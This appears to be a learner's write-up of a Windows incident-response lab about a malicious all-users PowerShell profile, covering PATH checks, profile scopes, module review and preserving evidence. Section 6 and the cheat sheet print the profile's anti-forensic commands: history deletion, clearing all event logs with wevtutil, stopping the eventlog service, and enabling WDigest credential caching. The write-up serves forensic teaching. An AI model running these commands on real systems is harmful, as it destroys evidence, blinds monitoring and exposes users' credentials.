# Windows Incident Surface — Task 2

## PowerShell Profiles, Execution Hijacking & Anti-Forensics

> **Before investigating a Windows system, investigate the investigation environment itself.**

---

# Mental Model

```text
Attacker modifies PowerShell profile
            ↓
Responder launches PowerShell
            ↓
Malicious profile executes automatically
            ↓
History deleted + Logs cleared + Logging stopped + Credentials weakened
            ↓
Investigator starts with incomplete evidence
```

### Main Question

> **Can I trust PowerShell before using it for investigation?**

This is the mindset for the entire task.

---

# 1. Start With CMD

If PowerShell has a malicious startup profile, simply launching it executes the attacker's code.

The lab starts with:

```text
C:\Users\Administrator\Desktop\tools\shells\CMD-DFIR.exe
```

### Investigation Principle

```text
Don't immediately execute the potentially compromised tool.
              ↓
Use another environment to inspect it first.
```

In a real investigation, also verify the "trusted" tool through its source, hash, signature, and integrity.

---

# 2. Inspect Environment Variables

### Question

> Could the attacker have modified the environment so commands or modules resolve from suspicious locations?

```cmd
set > env_vars.txt
type env_vars.txt
```

| Variable       | Purpose                            |
| -------------- | ---------------------------------- |
| `ComSpec`      | Current command interpreter        |
| `Path`         | Controls executable search order   |
| `PSModulePath` | PowerShell module search locations |
| `TEMP` / `TMP` | Temporary file locations           |
| `USERPROFILE`  | User profile location              |

### PATH Investigation

Windows searches PATH directories when resolving executables:

```text
Command → Search PATH directories → First matching executable → Execute
```

If an attacker-controlled or user-writable directory appears before system directories, it can be used for execution hijacking.

An unusual path **does not automatically mean compromise**.

Investigate:
- Is the directory expected?
- Who can write to it?
- Does it contain suspicious executables?
- Does it differ from a known-good system?

---

# 3. Verify PowerShell Resolution

### Question

> Which `powershell.exe` will Windows actually execute?

```cmd
where powershell.exe
```

Expected result:

```text
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

**Why:** You don't want to assume that typing `powershell.exe` will execute the legitimate Windows binary. Verify first.

---

# 4. PowerShell Profiles

A PowerShell profile is a startup script that automatically executes commands when PowerShell starts.

Four major scopes:

| Scope                     | Profile                                                              |
| ------------------------- | -------------------------------------------------------------------- |
| Current user / current host | `$HOME\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1` |
| All users / current host  | `$PSHOME\Microsoft.PowerShell_profile.ps1`                           |
| Current user / all hosts  | `$HOME\Documents\WindowsPowerShell\profile.ps1`                      |
| **All users / all hosts** | **`$PSHOME\profile.ps1`**                                            |

The most dangerous profile:

```text
C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1
```

Because it is system-wide, it affects PowerShell sessions for **all users**.

### Check If It Exists

```cmd
if exist "C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1" (echo EXISTS) else (echo NOT FOUND)
```

A profile existing does **not** prove it is malicious:

```text
Profile exists → Inspect contents → Understand behaviour → Determine whether legitimate
```

---

# 5. Observe PowerShell Startup

When PowerShell was started, it displayed:

```text
Less Murphy Ventures Co. Ps-History-Shredder Profile
```

The message explicitly refers to **history shredding** — a clue, not proof by itself. This leads to further investigation.

### Read the Profile Without Trusting It

```cmd
type "C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1"
```

---

# 6. What the Malicious Profile Did

### A. PowerShell History Destruction — T1070.003

```powershell
Set-PSReadlineOption -HistorySaveStyle SaveNothing
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
```

```text
Existing history → DELETE IT
Future history   → DON'T SAVE IT
```

PowerShell history can provide useful evidence about commands executed by an attacker. Deleting and disabling it makes command-line investigation harder.

### B. Clear Windows Event Logs — T1070.001

```powershell
wevtutil el | ForEach-Object { wevtutil cl $_ }
```

```text
wevtutil el → Enumerate logs → ForEach-Object → wevtutil cl → Clear each log
```

Windows event logs can contain evidence of authentication, system activity, security events, process activity.

**Room Answer:** The tool used to delete logs: `wevtutil`

### C. Stop Event Logging — T1562.002

```powershell
Stop-Service -Name "eventlog" -Force
```

```text
Clear logs  = Delete existing evidence
Stop service = Prevent future evidence
```

Together they provide stronger anti-forensic capability.

### D. Modify WDigest — T1552.002

```text
HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
UseLogonCredential = 1
```

```text
WDigest changed → Future logon → Credential material stays in memory → Theft easier
```

The setting does **not directly dump credentials**. Instead it prepares for easier theft at the next logon.

**Room Answer:**  
- Registry path: `HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest`  
- Value: `UseLogonCredential`

### E. Fake Startup Messages

```powershell
Write-Host "Less Murphy Ventures Co. Ps-History-Shredder Profile"
Write-Host "Loading Secure Console"
```

These make the startup appear legitimate while malicious actions run in the background.

> **Don't trust a tool because its output looks professional or legitimate. Verify its behaviour.**

### F. Change Working Directory

```powershell
Set-Location "$Env:UserProfile\Desktop"
```

Not inherently malicious — a reminder that malicious scripts can contain both normal and harmful actions. Analyze **behaviour**, not individual commands.

---

# 7. Why the Profile Is Malicious

The strongest evidence is the combination of actions:

```text
Disable PowerShell history
          +
Delete existing history
          +
Clear event logs
          +
Stop event logging
          +
Weaken credential protection
→ Designed to remove evidence, prevent collection, disrupt logging, and weaken security
```

---

# 8. Preserve Before Remediate

### DFIR Principle

```text
Preserve → Analyze → Remediate
```

Not: `Delete → Problem solved`

```cmd
ren C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1 profile.bak
```

`profile.bak` preserves the malicious artefact for analysis.

In a real investigation, collect: hash, timestamps, file permissions, owner, digital signature, contents.

---

# 9. Check PowerShell Modules

Attackers can also abuse PowerShell modules.

```powershell
Get-Module | Format-Table ModuleType, Version, Name
Get-Module -ListAvailable | Select-Object ModuleType, Version, Name
Get-Module -ListAvailable -Name <ModuleName> | Format-List *
Get-Command -Module <ModuleName>
```

Investigate: Path, Timestamp, Owner, Digital signature, Hash, Contents.

Compare suspicious modules against a known-good or approved system.

---

# 10. Attack Story

```text
Malicious system-wide PowerShell profile
                ↓
Automatic execution
                ↓
PowerShell history disabled + existing history deleted
                ↓
Windows event logs cleared + Event Log service stopped
                ↓
WDigest configuration modified → Credential protection weakened
                ↓
Investigator starts with reduced evidence
```

---

# 11. Investigation Workflow

```text
Can I trust the shell?
        ↓
Inspect environment → Check PATH → Verify executable resolution
        ↓
Check PowerShell profiles → Inspect startup behaviour → Read profile contents
        ↓
Identify anti-forensics → Identify security weakening
        ↓
Preserve suspicious artefacts → Remediate → Verify clean environment
```

---

# Quick Cheat Sheet

| Question                        | Command / Location                     |
| ------------------------------- | -------------------------------------- |
| Inspect environment             | `set`                                  |
| Check PowerShell resolution     | `where powershell.exe`                 |
| Check system-wide profile       | `$PSHOME\profile.ps1`                  |
| Read profile (without trusting) | `type ...\profile.ps1`                 |
| List loaded modules             | `Get-Module`                           |
| List available modules          | `Get-Module -ListAvailable`            |
| Investigate module commands     | `Get-Command -Module <ModuleName>`     |
| Clear Windows logs (attacker)   | `wevtutil cl`                          |
| PowerShell history manipulation | `Set-PSReadlineOption` / `Remove-Item` |
| Stop event logging              | `Stop-Service eventlog`                |
| WDigest setting                 | `UseLogonCredential`                   |

---

# What I Learned

### Core lesson

> **Before investigating a Windows system, investigate the investigation environment itself.**

- Check environment variables and `PATH`
- Verify which PowerShell executable will actually run
- Identify PowerShell startup profiles and their scopes
- Inspect a profile's contents without blindly trusting it
- Recognize PowerShell history destruction (T1070.003)
- Identify Windows event-log clearing via `wevtutil` (T1070.001)
- Recognize event logging disruption (T1562.002)
- Identify WDigest security weakening (T1552.002)
- Investigate PowerShell modules for suspicious entries
- Preserve malicious artefacts before remediation

### Most important mindset

```text
Don't ask: "What command gets the answer?"
Ask:       "Can I trust the environment giving me the answer?"
```
